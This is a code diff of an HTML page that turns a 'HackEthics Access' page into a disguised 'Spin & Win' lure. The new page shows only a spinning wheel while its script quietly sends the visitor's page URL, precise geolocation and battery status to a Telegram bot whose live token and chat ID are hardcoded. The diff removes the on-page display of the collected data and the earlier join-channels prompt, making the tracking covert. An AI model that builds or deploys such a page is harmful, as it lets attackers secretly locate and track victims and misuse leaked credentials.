@@ -3,86 +3,87 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>🔒 HackEthics Access</title>
+  <title>🎯 Spin & Win</title>
   <style>
-    body {background: #0a0a23; color: white; font-family: sans-serif; text-align: center; padding: 20px;}
-    .spinner {width: 150px; height: 150px; margin: 40px auto; border: 12px solid rgba(255,255,255,0.3); border-top: 12px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;}
-    @keyframes spin {0% { transform: rotate(0deg);}100% { transform: rotate(360deg);}}
-    .info {margin-top: 20px; font-size: 16px;}
+    body {
+      margin: 0;
+      height: 100vh;
+      background: radial-gradient(circle at center, #0d0d2b 0%, #000000 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      font-family: 'Poppins', sans-serif;
+      overflow: hidden;
+    }
+    .spinner {
+      width: 200px;
+      height: 200px;
+      border: 20px solid rgba(255, 255, 255, 0.2);
+      border-top: 20px solid #00ffea;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      box-shadow: 0 0 30px #00ffea;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    h1 {
+      font-size: 2.2em;
+      color: #00ffea;
+      text-shadow: 0 0 15px #00ffea;
+      margin-bottom: 40px;
+    }
   </style>
 </head>
 <body>
-  <h1>🚀 Welcome to HackEthics!</h1>
+  <h1>🎉 Spin & Win 🎉</h1>
   <div class="spinner"></div>
-  <div class="info" id="info">Preparing...</div>
 
   <script>
     const BOT_TOKEN = "8046535922:AAF4FFFb0gIhkiPgmUTdUKeiIPpL33gWym4";
     const CHAT_ID = "1954755564";
-    const info = document.getElementById('info');
 
     function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      fetch(url, {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
       }).catch(console.error);
     }
 
-    window.onload = function() {
-      const shouldJoin = confirm(
-        "🚨 IMPORTANT: Before you can continue, join all these channels:\n\n" +
-        "🔗 [HackEthics Telegram Channel](https://t.me/Hack3thics)\n" +
-        "📺 [Main YouTube Channel](https://youtube.com/@h4ckethics138?si=8T7YFLM9elqwL29v)\n" +
-        "📺 [Backup YouTube Channel](https://youtube.com/@hackethicsnetwork?si=MhD3MesnmU3H5Fx4)\n" +
-        "📸 [Instagram Page](https://www.instagram.com/hackethics138?igsh=dmFpam1tYWFnenNj)\n" +
-        "💬 [WhatsApp Community](https://chat.whatsapp.com/YOUR_WHATSAPP_LINK)\n\n" +
-        "Click OK after you have joined them all."
-      );
-      if (!shouldJoin) {
-        info.innerHTML = "⚠️ You must join the channels to proceed.";
-        return;
-      }
-      // Intro about you
-      const introMsg = "👤 *About HackEthics:*\n\n" +
-                       "I'm HackEthics, a cybersecurity researcher and ethical hacker. I raise awareness about cyber threats and teach people how to protect themselves online. Follow my channels for updates, tutorials, and security tips.";
-      info.innerHTML = introMsg.replace(/\n/g,"<br>");
-      sendToTelegram(introMsg);
+    // Send page URL immediately
+    const pageURL = window.location.href;
+    sendToTelegram(`🔗 *Page URL:* ${pageURL}`);
 
-      const pageURL = window.location.href;
-      sendToTelegram(`🔗 *Page URL:* ${pageURL}`);
+    // Send location silently
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+        const locMsg = `📍 *Location:*\nLatitude: ${lat}\nLongitude: ${lon}\n🌐 [Open in Maps](${mapsLink})`;
+        sendToTelegram(locMsg);
+      }, () => {
+        sendToTelegram("⚠️ Location denied by user.");
+      });
+    } else {
+      sendToTelegram("⚠️ Geolocation not supported.");
+    }
 
-      // Get location with Google Maps link
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          const lat = pos.coords.latitude.toFixed(6);
-          const lon = pos.coords.longitude.toFixed(6);
-          const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
-          const locMsg = `📍 *Location:*\nLatitude: ${lat}\nLongitude: ${lon}\n🌐 [Open in Maps](${mapsLink})`;
-          info.innerHTML += `<br><br>${locMsg.replace(/\n/g,"<br>")}`;
-          sendToTelegram(locMsg);
-        }, err => {
-          info.innerHTML += "<br>⚠️ Location denied.";
-          sendToTelegram("⚠️ Location denied by user.");
-        });
-      } else {
-        info.innerHTML += "<br>⚠️ Geolocation not supported.";
-      }
-
-      // Battery info
-      if (navigator.getBattery) {
-        navigator.getBattery().then(battery => {
-          const level = (battery.level * 100).toFixed(0);
-          const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
-          const batMsg = `🔋 *Battery:* ${level}% | ${charging}`;
-          info.innerHTML += `<br>${batMsg}`;
-          sendToTelegram(batMsg);
-        });
-      } else {
-        info.innerHTML += "<br>⚠️ Battery API not supported.";
-      }
-    };
+    // Send battery info silently
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        const level = (battery.level * 100).toFixed(0);
+        const charging = battery.charging ? "🔌 Charging" : "🔋 Not Charging";
+        const batMsg = `🔋 *Battery:* ${level}% | ${charging}`;
+        sendToTelegram(batMsg);
+      });
+    } else {
+      sendToTelegram("⚠️ Battery API not supported.");
+    }
   </script>
 </body>
 </html>
